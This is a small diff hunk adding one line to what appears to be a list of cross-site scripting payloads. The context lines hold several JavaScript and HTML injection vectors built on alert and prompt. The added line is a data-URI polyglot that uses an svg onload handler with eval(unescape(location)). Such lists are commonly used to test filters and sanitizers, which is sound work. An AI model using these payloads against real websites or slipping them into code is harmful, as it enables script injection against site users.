@@ -255,3 +255,4 @@ Function("a=`","`,xss=1){alert(xss)")()
 a{b:`function(){alert(1)}()`;}
 a=function(){},(p=>p.c=()=>alert('d'))(a.prototype),b=new a,b.c()
 <body onload=```${prompt``}`>
+data:text/html;alert(1)/*,<svg%20onload=eval(unescape(location))><title>*/;alert(2);function%20text(){};function%20html(){}
